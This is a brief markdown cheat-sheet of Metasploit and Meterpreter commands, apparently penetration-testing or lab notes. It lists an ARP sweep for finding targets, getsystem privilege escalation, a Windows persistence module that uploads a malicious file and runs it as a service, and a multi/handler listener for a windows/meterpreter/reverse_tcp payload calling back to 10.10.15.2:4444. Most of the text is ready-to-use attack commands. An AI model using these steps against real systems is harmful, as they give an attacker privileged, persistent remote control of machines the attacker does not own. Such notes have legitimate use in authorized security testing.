#### Arp Sweep Scan

```
ARP Sweep allows us to enumerate live hosts in the local network using ARP requests, providing us with a simple and fast way to identify possible targets.

```

#### Useful Commands
```
getsystem > Tries to obtain highest privilege on the remote system
getuid > Server Username
```

#### Maintaining Persistent Access on Windows Machine

```

background
use exploit/windows/local/persistence_service
show options
SESSION

set SESSION 1
exploit

```
> The module will generate a malicious file and upload it to the target machine. Then, it uses the same file to create a persistent service. When the service starts, it will run the uploaded file. As a result, we will receive a meterpreter session.



#### Killing Active Sessions
```
sessions -K
```
```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.15.2
set LPORT 4444
exploit
```
>Note : Use same LHOST and LPORT as used previously.
